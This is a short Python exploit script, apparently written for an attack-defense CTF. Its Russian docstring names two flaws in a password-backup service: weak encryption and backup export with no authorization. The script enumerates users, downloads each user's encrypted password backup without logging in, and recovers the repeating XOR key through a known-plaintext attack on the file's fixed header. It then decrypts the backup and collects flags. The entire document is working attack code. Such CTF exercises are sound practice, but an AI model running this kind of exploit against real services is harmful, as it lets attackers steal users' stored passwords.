import requests
import json
import sys

PORT = 8000


def get_users(r):
    users = []
    for i in range(len(json.loads(r))):
        users.append(json.loads(r)[i]["username"])
    return users


def decrypt(url, sapher_message):
    string = b'Data format: {"password":<user-password>, "title":<service-title>}{<next record>}'
    key = b''
    cypher_message = str.encode(sapher_message)
    for i in range(64):
        key += bytes([cypher_message[i] ^ string[i]])
    k = 0
    answer = ''
    for i in cypher_message:
        answer += (chr(i ^ key[k % 64]))
        k += 1
    return answer


def main():
    """
    Фиговое шифрование бекапа паролей + выгрузка бекапа без авторизации
    """
    args = sys.argv[1:]
    url = f'http://{args[0]}:{PORT}/api'
    r = requests.get(f'{url}/get_users')
    flags = []
    if r.status_code == 200:
        users = get_users(r.text)
        for i in users:
            r = requests.get(f'{url}/export?username={i}')
            link = json.loads(r.text)["link"]
            r = requests.get(f'{url}/file?link={link}')
            decrypted = decrypt(url, r.text)
            flags.append(decrypted[decrypted.rfind(': ')+1:])
        return flags


if __name__ == "__main__":
    print(main())
